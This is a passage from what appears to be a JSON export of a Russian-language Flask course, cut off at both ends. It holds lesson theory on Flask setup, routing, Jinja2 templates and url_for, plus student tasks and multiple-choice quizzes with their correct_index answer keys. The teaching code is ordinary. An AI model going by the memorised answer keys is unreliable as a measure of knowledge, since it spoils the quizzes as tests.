                            "Только HTML-файл",
                            "Только строку",
                            "Любой корректный HTTP-ответ, в том числе строку с HTML ",
                            "Только объект Flask"
                        ],
                        "question": "Что может возвращать функция маршрута Flask?",
                        "correct_index": 2
                    },
                    {
                        "id": 9,
                        "options": [
                            "Такой код сложно поддерживать и масштабировать ",
                            "Flask не поддерживает HTML",
                            "Это снижает безопасность сервера",
                            "Браузер не сможет отобразить страницу"
                        ],
                        "question": "Почему не рекомендуется возвращать HTML-код прямо из функции маршрута в реальных проектах?",
                        "correct_index": 0
                    }
                ],
                "theory_html": "<h4>1. Введение</h4><p>Flask — это микрофреймворк для создания веб-приложений на языке Python.</p><p>Он предоставляет базовый набор возможностей для обработки HTTP-запросов и формирования ответов, а всё остальное разработчик добавляет по мере необходимости с помощью расширений.</p><p>Ключевая идея Flask — простота и гибкость:</p><p>- можно быстро начать с минимального кода;</p><p>- можно постепенно расширять проект, не переписывая его с нуля.</p><p>Flask широко используется:</p><p>- для учебных проектов;</p><p>- для внутренних сервисов;</p><p>- для прототипирования;</p><p>- для полноценных веб-приложений при грамотной архитектуре.</p><p>Для генерации HTML-страниц Flask использует шаблонизатор Jinja2, который позволяет вставлять в HTML:</p><p>- переменные;</p><p>- условия;</p><p>- циклы;</p><p>- используя синтаксис, похожий на Python.</p><p>(О том, что такое шаблонизатор и о синтаксисе Jinja2 в следующих лекциях)</p><p>&nbsp;</p><h4>2. Как работает веб-приложение</h4><p>Когда пользователь вводит адрес сайта в браузере (например, example.com), браузер отправляет HTTP-запрос на сервер, где размещено веб-приложение.</p><p>Упрощённая схема работы выглядит так:</p><p>Браузер → Веб-сервер → Flask-приложение → Ответ браузеру</p><p>На сервере обычно установлены:</p><p>операционная система (чаще Linux);</p><p>веб-сервер (например, Nginx);</p><p>сервер приложений Python (например, gunicorn);</p><p>само Flask-приложение.</p><p>Flask-приложение является WSGI-приложением.</p><p>WSGI (Web Server Gateway Interface) — это стандарт взаимодействия между:</p><p>веб-сервером;</p><p>Python-приложением.</p><p>WSGI — не сервер и не интерпретатор, а именно интерфейс (набор правил), по которым сервер передаёт запросы Python-приложению и получает ответы.</p><p>На каждом HTTP-запросе Flask:</p><p>получает запрос;</p><p>находит соответствующий маршрут;</p><p>выполняет связанную с ним функцию (представление, view);</p><p>возвращает HTTP-ответ браузеру.</p><p>&nbsp;</p><figure class=\"image\"><img src=\"https://gvylosdtlepiikialkhn.supabase.co/storage/v1/object/public/lesson-images/0d8310c3-3f02-4515-a9cd-0a56cc355762.png\"></figure><h4>3. Подготовка окружения и установка Flask</h4><p>В современных Python-проектах обязательно используется виртуальное окружение, чтобы изолировать зависимости проекта.</p><p>&nbsp;</p><p>Шаг 1. Создание проекта</p><p>Создайте папку проекта:</p><p><code>flask304</code></p><p>Откройте эту папку в VS Code.</p><p>Откройте терминал:</p><p>Terminal → New Terminal</p><p>Снизу откроется окно терминала для ввода команд (причём именно в папке проекта)</p><p>(Terminal&nbsp;это то же, что окно командной строки, CMD, Bash, интерфейс ввода и&nbsp;выполнения команд, совершения различных действий, в операционной системе без графического интерфейса, причём команды, обычно, отличаются для ОС Windows&nbsp;и ОС Linux/Mac, но иногда бывают похожи или одинаковы)</p><p>&nbsp;</p><p>Шаг 2. Создание виртуального окружения.</p><p>виртуальное окружение - virtual environment, сокр.: venv</p><p>&nbsp;</p><p>В терминале выполните:</p><p><code>python -m venv venv</code></p><p><i>После выполнения этой команды в папке проекта появится папка&nbsp;venv. Это служебная папка, мы её не будем использовать. В эту папку будут устанавливаться пакеты/библиотеки, в т.ч.&nbsp;Flask. Таким образом, пакеты/библиотеки будут специфичны для данного проекта, и не будут влиять на другие проекты. То же самое относится к работающему приложению на \"боевом\" сервере. Приложение будет выполняться в своей изолированной среде и не влиять и не получать влияние от других, запущенных на этом сервер приложений.</i></p><p>&nbsp;</p><p>Активируйте&nbsp;окружение:</p><p>Windows</p><p><code>venv\\Scripts\\activate</code></p><p>Linux / macOS</p><p><code>source venv/bin/activate</code></p><p>После активации в начале строки терминала появится (venv).</p><p>&nbsp;</p><p>Шаг 3. Установка Flask</p><p>Для установки используется специальная команда pip.</p><p>pip - это менеджер пакетов Python, для установки дополнительных пакетов/библиотек для решения различных задач, которые не входят в стандартную установку (ядро) Python</p><p>&nbsp;</p><p>Установите Flask:</p><p><code>pip&nbsp;install&nbsp;flask</code></p><p>Проверьте установку:</p><p><code>pip&nbsp;show&nbsp;flask</code></p><p>Если всё установилось успешно, в терминале вы увидите ряд сообщений, включая номер установленной версии библиотеки (фреймворка) Flask.</p><p>&nbsp;</p><h4>4. Первое Flask-приложение</h4><p>Шаг 1. Создание файла приложения</p><p>В папке проекта создайте файл:</p><p>app.py</p><p>&nbsp;</p><p>Шаг 2.&nbsp;Код&nbsp;приложения</p><pre><code class=\"language-plaintext\">from flask import Flask\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route(\"/\")\r\ndef&nbsp;index():\r\n    return \"Привет, 304 группа!\"\r\n\r\nif __name__ == \"__main__\":\r\n    app.run(debug=True)</code></pre><p>Пояснения к коду:</p><p>Flask — основной класс фреймворка.</p><p>app = Flask(__name__) — создание объекта приложения.</p><p>@app.route(\"/\") — декоратор, связывающий URL-адрес с функцией.</p><p>Функция index() выполняется при обращении к главной странице сайта (которая будет называться index.html, и которую мы создадим позже).</p><p>Возвращаемое значение функции становится HTTP-ответом.</p><p>Условие if __name__ == '__main__': должно быть записано именно так.</p><p><i>(Объяснение этого нам не важно, но желающие могут спросить в&nbsp;ChatGPT самостоятельно)</i></p><p>debug=True включает режим разработки:</p><p>- автоматический перезапуск приложения;</p><p>- подробные сообщения об ошибках.</p><p>В рабочем (боевом) окружении debug=True никогда не используется.</p><p>(Понятие декораторов рассматривается в объектно-ориентированном программировании на Python. Сейчас нам вникать в это не нужно)</p><p>&nbsp;</p><h4>5. Запуск приложения</h4><p>В терминале выполните:</p><p><code>python app.py</code></p><p>В консоли появится сообщение о запуске локального сервера, например:</p><p><code>http://127.0.0.1:5000</code></p><p>Откройте браузер и перейдите по этому адресу.</p><p>Вы увидите сообщение «Привет, 304 группа!».</p><p>(Проще в VS&nbsp;Code, в окне терминала, нажать на подчёркнутый адрес сервера удерживая 'ctrl').</p><p>&nbsp;</p><p>Измените текст, выводимый на домашнюю страницу, на 'Всем пока' (в функции index()) и обновите браузер.</p><p>Обратите внимание: нам не нужно при изменении кода каждый раз перезапускать сервер, он перезапускается автоматически (благодаря параметру debug=True).</p><p>Но, при этом всё же нужно обновлять браузер клавишей F5.</p><p>&nbsp;</p><p>6. Остановите сервер в терминале нажав кнопку корзины.</p><p>Зайдите в браузер и обновите. Вы увидите, что страница перестала рендерится т.к. сервер был остановлен.</p><p>Если в процессе разработки будут какие то непонятные ошибки, не связанные с кодом, может помочь остановка и запуск сервера, закрытие и открытие браузера, закрытие и открытие VS&nbsp;Code.</p><p>&nbsp;</p><p><i>Примечание: При создании приложения и наборе кода могут возникать ошибки. Для начала проверьте правильность кода, если всё равно возникают ошибки - обратись к преподавателю.</i></p><p>&nbsp;</p><h4>6. Несколько страниц и маршрутов</h4><p>Flask позволяет создавать несколько маршрутов — отдельных страниц сайта.</p><p>&nbsp;</p><p>Обратите внимание, в дальнейшем я не буду писать полный код файла приложения. Базовый код остаётся тот же самый, т.е. в начале файла импорты и создание экземпляра приложения:</p><p><code>from flask import Flask</code></p><p><code>app = Flask(__name__)</code></p><p>и в конце файла запуск приложения:</p><p><code>if __name__ == '__main__':</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;app.run(debug=True)</code></p><p>я буду приводить только изменённый код маршрутов и другой python&nbsp;код.</p><p>&nbsp;</p><p>Измените код функции-обработчика маршрута главной страницы.</p><p><code>@app.route(\"/\")</code></p><p><code>def index():</code></p><p><code>&nbsp; &nbsp; return \"\"\"</code></p><p><code>&nbsp; &nbsp; &lt;h1&gt;Главная страница&lt;/h1&gt;</code></p><p><code>&nbsp; &nbsp; &lt;a href=\"/hello\"&gt;Перейти к приветствию&lt;/a&gt;</code></p><p><code>&nbsp; &nbsp; \"\"\"</code></p><p>&nbsp;</p><p>Напишите код функции-обработчика маршрута второй страницы.</p><p><code>@app.route(\"/hello\")</code></p><p><code>def hello():</code></p><p><code>&nbsp; &nbsp; return \"\"\"</code></p><p><code>&nbsp; &nbsp; &lt;h1&gt;Привет, Flask!&lt;/h1&gt;</code></p><p><code>&nbsp; &nbsp; &lt;a href=\"/\"&gt;Назад&lt;/a&gt;</code></p><p><code>&nbsp; &nbsp; \"\"\"</code></p><p>Обратите внимание: в коде обоих страниц есть гиперссылки для перехода между этими страницами.&nbsp;</p><p>&nbsp;</p><p>Запустите на выполнение файл app.py.</p><p>(А если сервер уже/ещё запущен, он автоматически отслеживает изменения в файлах, можно просто обновить страницу).</p><p>&nbsp;</p><p>Протестируйте работу приложения, в т.ч. переход между страницами. Обратите внимание на то, что написано в адресной строке.</p><p>&nbsp;</p><p>Таким образом мы создали первое работающее web-приложение на Python-фреймворке Flask.</p><p>&nbsp;</p><p>Конечно, html-код страниц приложения явно будет большой, поэтому возвращать его в функции return в виде html-кода неправильно. Так мы написали только для демонстрации.&nbsp;</p><p>В реальных проектах:</p><p>- HTML хранится в отдельных файлах;</p><p>- используется шаблонизатор Jinja2;</p><p>- Python-код отвечает за логику, а HTML — за отображение.</p><p>Этому будет посвящено следующее занятие.</p><p>Шаблонизатор - это такая программа, которая получает на вход:&nbsp;</p><p>1: шаблон web-страницы с html-кодом, но без полезных, отображаемых данных, и -&nbsp;</p><p>2: сами данные для отображения на web-странице из python-приложения, которые, в свою очередь, получены из базы данных или какого-то API, и как-то обработаны.</p><p>Шаблонизатор соединяет html-код и данные (вставляет данные в нужные места html-кода) в соответствии с макетом web-страницы.</p><p>&nbsp;</p><h4>7. Преимущества и ограничения Flask</h4><p>Преимущества:</p><p>- Простота и низкий порог входа</p><p>- Гибкость архитектуры</p><p>- Большое сообщество</p><p>- Подходит для обучения и прототипирования</p><p>Ограничения:</p><p>- Минимальный функционал «из коробки»</p><p>- Требует осознанного проектирования структуры</p><p>- Не является асинхронным ASGI-фреймворком по умолчанию (в отличие от FastAPI).</p><p>Flask идеально подходит для небольших и средних проектов, а также для обучения основам веб-разработки.</p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 6,
            "section_id": 1,
            "number": 3,
            "name": "Передача шаблонам параметров. Автоматическое формирование html-кода",
            "slug": "params--html-generating",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p><span style=\"color:black;\">На основе вложенного списка</span></p><pre><code class=\"language-python\">LISTS = [\n &nbsp;&nbsp; [\"первый\", \"второй\", \"третий\"],\n &nbsp;&nbsp; [\"first\", \"second\"],\n &nbsp;&nbsp; [\"one\", \"two\", \"three\"]\n]</code></pre><p><span style=\"color:black;\">Сформируйте двухуровневый список</span></p><p><span style=\"color:black;\">на странице 'about', что то типа:</span></p><figure class=\"image image_resized\" style=\"width:18.52%;\"><img style=\"aspect-ratio:243/328;\" src=\"https://gvylosdtlepiikialkhn.supabase.co/storage/v1/object/public/lesson-images/0cba5185-520b-4457-bf35-2149565840ff.png\" width=\"243\" height=\"328\"></figure>"
                    },
                    {
                        "id": 2,
                        "content": "<p>Добавьте в приложение новую страницу courses.html.</p><p>Передайте в шаблон параметр title и выведите корректный заголовок страницы через базовый шаблон.</p><p>В маршруте главной страницы передайте параметры username и course.</p><p>Выведите на странице приветствие вида:</p><p>«Добро пожаловать, username! Вы изучаете курс course.»</p>"
                    },
                    {
                        "id": 3,
                        "content": "<p>Создайте страницу profile.html.</p><p>Передайте в неё словарь с данными пользователя (имя, возраст, город) и выведите эти данные в виде HTML-таблицы.</p><p>Добавьте условие в шаблоне:</p><p>если список пустой — выведите сообщение</p><p>«Данные отсутствуют»,</p><p>иначе — выведите список элементов.</p>"
                    },
                    {
                        "id": 4,
                        "content": "<p>Создайте словарь меню в app.py, где ключ — имя маршрута, а значение — текст ссылки.</p><p>'маршрут' : 'текст гиперссылки'</p><p>Передайте этот словарь параметром во все маршруты.</p><p>В базовом шаблоне base.html переберите циклом переданный параметром словарь и сформируйте список гиперссылок в правильном формате, что то типа:</p><p><span style=\"color:black;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;font-size:14.0pt;\"><code>&lt;a href=\"{{url_for('маршрут')}}\"&gt;{{'текст гиперссылки'}}&lt;/a&gt;&nbsp;</code></span></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "{% title %}",
                            "{{ title }} ",
                            "<title> ",
                            "[[ title ]]"
                        ],
                        "question": "Какой синтаксис используется в шаблонах Jinja2 для вывода переданного параметра?",
                        "correct_index": 1
                    },
                    {
                        "id": 2,
                        "options": [
                            "Через глобальные переменные Python",
                            "Через HTML-комментарии",
                            "Через словари Python",
                            "Через аргументы функции render_template() "
                        ],
                        "question": "Каким способом данные передаются из Flask-приложения в шаблон?",
                        "correct_index": 3
                    },
                    {
                        "id": 3,
                        "options": [
                            "{% if %}",
                            "{% while %}",
                            "{% for %} ",
                            "{% loop %}"
                        ],
                        "question": "Какой управляющей конструкцией Jinja2 используется для перебора списка?",
                        "correct_index": 2
                    },
                    {
                        "id": 4,
                        "options": [
                            "dict.key",
                            "dict->key",
                            "dict[key] ",
                            "dict(key)"
                        ],
                        "question": "Как в шаблоне Jinja2 получить доступ к элементам словаря, переданного из Flask?",
                        "correct_index": 2
                    },
                    {
                        "id": 5,
                        "options": [
                            "Для ускорения загрузки страниц",
                            "Для автоматического создания HTML-кода",
                            "Для корректного формирования URL по имени функции маршрута ",
                            "Для подключения внешних библиотек"
                        ],
                        "question": "Для чего рекомендуется использовать функцию url_for() при формировании ссылок?",
                        "correct_index": 2
                    }
                ],
                "theory_html": "<h4>1. Передача шаблонам параметров.</h4><p>Мы можем использовать всю мощь языка Python для динамического формирования содержимого web-страниц.</p><p><i>Напомним, что обычные web-страницы написанные на языке HTML являются статичными, неизменяемыми, потому что сам язык HTML по сути статичен. Это означает что HTML-код страницы вместе с полезной, выводимой информацией после того как он написан и размещён на сервере не может быть изменён никакими внешними воздействиями. Т.е. все клиенты (посетители сайта) всегда будут видеть одну и ту же страницу. Изменить страницу может только сам разработчик сайта, например, набрать новый html-код, добавить новую информацию и загрузить изменённую страницу заново на сервер.&nbsp;</i></p><p><i>Изменить это положение призваны языки web-программирования, такие как JavaScript для изменения содержимого страницы непосредственно в браузере клиента (frontend) или изменение содержимого страницы на сервере (или вообще динамическое формирование страницы с нуля) (backend). И клиенты (браузеры) будут получать каждый раз новую или изменённую страницу (например, в зависимости от изменения данных во внешних источниках).</i></p><p>Мы можем использовать для формирования содержимого web-страниц переменные, структуры данных, арифметические вычисления, условия, циклы, функции и пр., всю мощь языка Python.</p><p>В частности мы можем передавать в шаблоны страниц параметры.</p><p>&nbsp;</p><p>Вспомните, как мы формировали для разных страниц разное содержимое тэга <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">&lt;title&gt;</span>. Однако, часто бывает, что страницы не только наполняются, но и создаются динамически, поэтому имеет смысл передавать <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">'titlle'</span> параметром в функции маршрута / рендеринга самого приложения, а не в шаблоне.</p><p>&nbsp;</p><p>1. Измените шаблон <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\"><code>base.html</code></span> следующим образом:</p><p>(только часть кода - тэг &lt;title&gt;)</p><pre><code class=\"language-python\">  &lt;title&gt;\r\n &nbsp;&nbsp; {% block title %}\r\n &nbsp;&nbsp;&nbsp;&nbsp; {% if title %}\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {{title}} | Flask-site\r\n &nbsp;&nbsp;&nbsp;&nbsp; {% else %}\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flask-site\r\n &nbsp;&nbsp;&nbsp;&nbsp; {% endif %}\r\n &nbsp;&nbsp; {% endblock %}\r\n  &lt;/title&gt;</code></pre><p>&nbsp;</p><p>&nbsp;</p><p>2. Измените код функций рендеринга в app.py следующим образом:</p><pre><code class=\"language-python\">@app.route(\"/\")\r\ndef index():\r\n &nbsp;&nbsp; return render_template(\"index.html\", title=\"Главная\")\r\n@app.route(\"/about/\")\r\ndef about():\r\n &nbsp;&nbsp; return render_template(\"about.html\", title=\"О приложении\")</code></pre><p>Пояснения к коду:</p><p>В функции рендеринга мы добавили параметр <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">'title'</span> c содержимым для тэга <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">&lt;title&gt;</span> соответствующей страницы.</p><p>А файле <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">base.html</span> мы описали следующую идею:</p><p>если параметр <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">title</span> передан мы показываем его и рядом показываем <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">' | Flask-site '</span> (ну т.е. какой то постоянный текст), а если не передан, то показываем только <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">'Flask-site'</span>.</p><p>Обратите внимание на синтаксис: как с помощью шаблонизатора Jinja2 формируются блоки программного кода (в данном случае конструкция условия). Также обратите внимание как принимаются в шаблоне переданные из приложения параметры - в двойных фигурных скобках.</p><p>Примечание. Если у вас есть третья страница и третий маршрут, измените соответствующим образом и его.</p><p>&nbsp;</p><p>&nbsp;</p><p>3. В самих страницах <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">(index, about)</span> уберите строчку кода с блоком title, например:</p><p><code>{% block title %}О приложении{% endblock %}</code></p><p>Она нам не нужна, т.к. содержимое <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">&lt;title&gt;</span> приходит из базового шаблона.</p><p>&nbsp;</p><p>&nbsp;</p><p>4. Запустите приложение из терминала командой:</p><p><code>python app.py</code></p><p>&nbsp;</p><p>&nbsp;</p><p>5. Протестируйте приложение, переходя по ссылкам и обращая внимание на титульник страницы на вкладке браузера. Попробуйте убрать параметр, в каком ни будь маршруте (например: <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">title=\"О приложении\"</span>) и посмотрите, как меняется <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">title</span>.</p><p>&nbsp;</p><p>&nbsp;</p><h4>2. Другой пример передачи параметра в тело страницы.</h4><p>Измените код в маршруте главной страницы следующим образом:</p><pre><code class=\"language-python\">@app.route(\"/\")\r\ndef index():\r\n &nbsp;&nbsp; return render_template(\r\n\"index.html\", title=\"Главная\", group=\"304\")</code></pre><p>т.е. мы добавили параметр group=\"304\".</p><p>Измените код шаблона index.html следующим образом: добавьте после заголовка &lt;h1&gt; следующую строку:</p><p><span style=\"font-family:&quot;Courier New&quot;;\"><code>&lt;h3&gt;Привет {{group}} группа&lt;/h3&gt;</code></span></p><p>Итак, запомним: мы можем передать любые динамические данные на страницу указав их в функции-обработчике маршрута в переменной-параметре, и принять их на странице параметром с тем же именем в двойных фигурных скобках {{ }}.</p><p>&nbsp;</p><p>&nbsp;</p><h4>3. Использование управляющих конструкций и структур данных для динамического формирования кода web-страниц</h4><p>Мы можем использовать любые управляющие конструкции языка python, например: условия, циклы, генераторы, функции, и любые структуры данных, например: списки, множества, словари, для динамического формирования кода на сервере и выдачи клиенту (браузеру) сформированного html-кода с данными.</p><p>&nbsp;</p><p>Давайте сформируем список html (т.е. &lt;ol&gt; &lt;li&gt;), на основе списка (list) python.</p><p>(Это может быть, например, список товаров, который приходит из базы данных, и может быть каждый раз разный).</p><p>1. Добавьте в файл приложения (app.py) перед функцией рендеринга главной страницы следующий код:</p><p><code>LIST = [\"первый\", \"второй\", \"третий\"]</code></p><p>А в саму функцию добавьте передачу этого списка параметром:</p><pre><code class=\"language-python\">@app.route(\"/\")\r\ndef index():\r\n  return render_template(\"index.html\", title=\"Главная\", LIST = LIST)</code></pre><p>&nbsp;</p><p>&nbsp;</p><p>2. Измените код шаблона страницы index.html следующим образом:</p><pre><code class=\"language-python\">{% extends 'base.html' %}\r\n{% block content %}\r\n  &lt;h1&gt;Главная страница&lt;/h1&gt;\r\n  &lt;h3&gt;Список&lt;/h3&gt;\r\n  &lt;ol&gt;\r\n &nbsp;&nbsp; {% for item in LIST %}\r\n &nbsp;&nbsp; &lt;li&gt;{{item}}&lt;/li&gt;\r\n &nbsp;&nbsp; {% endfor %}\r\n  &lt;/ol&gt;\r\n{% endblock %}</code></pre><p>&nbsp;</p><p>Пояснения к коду:</p><p>Сначала формируем обёртку для списка &lt;ol&gt;&lt;/ol&gt;, далее пишем цикл python в синтаксисе Jinja2.&nbsp;</p><p>В цикле пробегаемся по списку LIST (который у нас получен из приложения параметром) и выводим каждый пункт списка.</p><p>В приложении измените список и вы увидите, что html-код (и визуализированный из него список) поменялся автоматически.</p><p>&nbsp;</p><p>&nbsp;</p><h4>4. Рендеринг словаря (dict) вложенными циклами.</h4><p>Пусть у нас есть python-словарь:</p><pre><code class=\"language-python\">plants = {\"Овощи\": [\"огурец\", \"помидор\", \"кабачок\"],\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"Фрукты\": [\"яблоко\", \"груша\", \"персик\", \"абрикос\"],\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"Зелень\": [\"петрушка\", \"кинза\"]}</code></pre><p>Добавьте это код в app.py и также замените параметр в функции рендеринга на</p><p>plants = plants</p><p>&nbsp;</p><p>В шаблоне index.html измените код списка на следующий:</p><pre><code class=\"language-python\">  &lt;ul&gt;\r\n &nbsp;&nbsp; {% for key in plants %}\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;li&gt;{{key}}\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;ul&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {% for i in plants[key] %}\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;li&gt;{{i}}&lt;/li&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {% endfor %}\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/ul&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;/li&gt;\r\n &nbsp;&nbsp; {% endfor %}\r\n  &lt;/ul&gt;</code></pre><p>Обратите внимание, как правильно выводить ключи и значения словаря.</p><p>&nbsp;</p><p>&nbsp;</p><h4>5. Правильное формирование меню сайта</h4><p>Как вы помните, у нас в базовом шаблоне base.html есть меню сайта:</p><p><code>&lt;a href=\"/\"&gt;На Главную&lt;/a&gt;</code></p><p><code>&lt;a href=\"/about\"&gt;О приложении&lt;/a&gt;</code></p><p>Т.е. гиперссылки, при клике на которые запускаются соответствующие функции - обработчики маршрутов, которые по HTTP запрашивают с сервера соответствующие html-страницы, отправляют их в браузер и рендерят.</p><p>Однако такой способ жёсткой записи гиперссылок или, говоря языком бэкенда, маршрутов ведущих на другие страницы или ресурсы web-приложения сильно ограничен. В реальных крупных web-приложениях маршруты могут длинными и многоуровневыми. Если у нас поменяется маршрут (URL, физическое местоположение другой страницы или ресурса), то ссылки перестанут работать (станут \"битыми\").&nbsp;</p><p>Маршруты могут формироваться динамически.</p><p>Поэтому существует более правильный способ записи маршрутов в меню web-приложения.&nbsp; Замените код гиперссылок меню в base.html следующим кодом:</p><p><code>&lt;a href=\"{{ url_for('index') }}\"&gt;Главная&lt;/a&gt;</code></p><p><code>&lt;a href=\"{{ url_for('about') }}\"&gt;О приложении&lt;/a&gt;</code></p><p>Обратите внимание: здесь мы указываем не URL (адрес) ресурса, а имя функции, обрабатывающей данный маршрут.</p><p>Запустите приложение и убедитесь, что меню работает, и переходы между страницами работают.</p><p>С <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">url_for() </span>мы можем редактировать маршруты и гарантировать, что ссылки будут работать должным образом. Функция <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">url_for()</span> также заботится о других вещах, таких как экранирование специальных символов.</p><p>&nbsp;</p><p>Если нам нужно одну и ту же страницу отобразить по нескольким URL-адресам, следует добавить несколько конструкций <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">rout</span>e, например:</p><p>&nbsp;</p><pre><code class=\"language-python\">@app.route(\"/index\")\r\n@app.route(\"/\")\r\ndef index():\r\n &nbsp;  # код обработчика</code></pre><p>Бывает, что посетитель заходит на главную страницу сайта не только по URL доменного имени, например: my-site.kz (что соответствует маршруту '/'), но и прямо указав имя главной страницы my-site.kz/index. В таких случаях и поможет данная конструкция маршрута.</p><p>&nbsp;</p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 19,
            "section_id": 4,
            "number": 2,
            "name": "Создание шаблонов и моделей данных",
            "slug": "flask-login-templates-and-modeles",
            "content": {
                "tasks": [],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Для подключения контента сторонних JavaScript- и CSS-библиотек через CDN",
                            "Для определения области, в которую дочерние шаблоны подставляют свой HTML-контент",
                            "Для выполнения SQL-запросов непосредственно из HTML-шаблона",
                            "Для проверки прав доступа пользователя при загрузке страницы"
                        ],
                        "question": "Зачем в шаблонах используется конструкция {% block content %}?",
                        "correct_index": 1
                    },
                    {
                        "id": 2,
                        "options": [
                            "Он проверяет корректность введённого аутентифицированным текущим пользователем пароля",
                            "Он определяет, была ли выполнена инициализация базы данных для текущего пользователя",
                            "Он автоматически создает объект аутентифицированного текущего пользователя в базе данных",
                            "Он позволяет отображать разные элементы интерфейса в зависимости от того, авторизован пользователь или нет"
                        ],
                        "question": "Какую роль играет current_user.is_authenticated в шаблонах?",
                        "correct_index": 3
                    },
                    {
                        "id": 3,
                        "options": [
                            "Чтобы автоматически создать таблицу пользователей при запуске приложения",
                            "Чтобы добавить модели User поддержку шаблонов UserMixin в Jinja2",
                            "Чтобы предоставить Flask-Login необходимые методы и свойства для управления пользователем",
                            "Чтобы включить поддержку Tailwind CSS в модели данных User"
                        ],
                        "question": "Зачем класс User наследуется от UserMixin?",
                        "correct_index": 2
                    },
                    {
                        "id": 4,
                        "options": [
                            "Чтобы создать уникальный идентификатор каждой записи в таблице пользователей ",
                            "Чтобы запретить изменение значения идентификатора после создания первичной записи",
                            "Чтобы автоматически зашифровать идентификатор пользователя с помощью первичного ключа",
                            "Чтобы связать пользователя с конкретным HTML-шаблоном по ключу primary_key"
                        ],
                        "question": "Для чего в модели пользователя поле id объявляется с параметром primary_key=True?",
                        "correct_index": 0
                    },
                    {
                        "id": 5,
                        "options": [
                            "Чтобы запустить встроенный сервер Flask с контекстом приложения app_context()",
                            "Чтобы временно связать базу данных с конкретным экземпляром Flask-приложения ",
                            "Чтобы автоматически авторизоваться под администратором",
                            "Чтобы активировать подключение Tailwind CSS в контексте приложения app_context()"
                        ],
                        "question": "Зачем при инициализации базы данных используется with app.app_context()?",
                        "correct_index": 1
                    },
                    {
                        "id": 6,
                        "options": [
                            "Полностью удаляет существующую базу данных и пересоздает её заново со всеми таблицами",
                            "Создает все HTML-шаблоны в папке templates",
                            "Автоматически создает соответствующие таблицы в базе данных ",
                            "Регистрирует тестовых пользователей по умолчанию  при инициализации базы данных"
                        ],
                        "question": "Что делает команда db.create_all() при запуске init_db.py?",
                        "correct_index": 2
                    }
                ],
                "theory_html": "<p>В этой лекции мы перейдем от пустых страниц к реальному интерфейсу.</p><p>Мы будем использовать Tailwind CSS — самый популярный современный CSS-фреймворк, который позволяет стилизовать элементы прямо в HTML-коде.</p><p>Что это такое, и чем Tailwind отличается от Bootstrap - почитайте самостоятельно в ChatGPT (не сильно углубляясь - это выходит за рамки этого курса).</p><p>Также мы создадим структуру базы данных.</p><p>&nbsp;</p><p><strong>1. Базовый шаблон</strong></p><p>Мы используем концепцию наследования шаблонов Jinja2.</p><p>Создаем один главный файл, который содержит навигацию и ссылки на стили, а остальные страницы будут вставлять свой контент внутрь него.</p><p>Создайте файл <code>project/templates/base.html</code> со следующим кодом:</p><pre><code class=\"language-jinja2\">&lt;!DOCTYPE html&gt;\r\n&lt;html lang=\"ru\"&gt;\r\n &lt;head&gt;\r\n  &lt;meta charset=\"UTF-8\"&gt;\r\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\r\n  &lt;title&gt;Flask Auth App 2026&lt;/title&gt;\r\n  &lt;script src=\"https://cdn.tailwindcss.com\"&gt;&lt;/script&gt;\r\n&lt;/head&gt;\r\n \r\n&lt;body class=\"bg-gray-50 min-h-screen\"&gt;\r\n  &lt;nav class=\"bg-white shadow-md\"&gt;\r\n    &lt;div class=\"max-w-7xl mx-auto px-4\"&gt;\r\n      &lt;div class=\"flex justify-between h-16\"&gt;\r\n        &lt;div class=\"flex space-x-7\"&gt;\r\n          &lt;div class=\"flex items-center py-4\"&gt;\r\n            &lt;a href=\"{{ url_for('main.index') }}\"\r\n               class=\"font-semibold text-gray-500 text-lg\"&gt;\r\n              FlaskAuth\r\n            &lt;/a&gt;\r\n          &lt;/div&gt;\r\n        &lt;/div&gt;\r\n        &lt;div class=\"flex items-center space-x-3\"&gt;\r\n          &lt;a href=\"{{ url_for('main.index') }}\"\r\n            class=\"py-2 px-2 font-medium text-gray-500 hover:text-blue-500 transition duration-300\"&gt;\r\n            Главная\r\n          